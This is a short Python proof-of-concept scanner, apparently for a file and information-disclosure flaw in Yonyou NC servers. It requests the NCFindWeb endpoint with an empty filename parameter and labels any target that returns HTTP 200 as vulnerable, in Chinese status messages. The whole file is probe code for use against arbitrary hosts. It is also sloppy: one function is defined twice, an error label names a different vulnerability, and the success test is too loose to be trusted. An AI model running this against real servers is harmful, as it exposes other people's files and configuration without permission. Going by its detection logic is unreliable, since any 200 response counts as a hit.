import time
import requests
import re
import sys
from urllib.parse import quote

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    url = target_url + '/NCFindWeb?service=IPreAlertConfigService&filename='
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
    success_msg = now_time() + '[SUCCESS]  该系统可能数据库管理信息泄漏漏洞'
    shell_msg = now_time() + '具体URL为:{}'.format(url)
    warning_msg = now_time() + '[WARNING]该系统不存在此漏洞'
    error_msg = now_time() + '[nc_U8_getSessionList][ERROR]无法该目标无法建立连接'
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=url, headers=headers, timeout=30)
        if response.status_code == 200 and response.text != None:
            return success_msg,shell_msg
        else:
            return warning_msg
    except:
        return error_msg

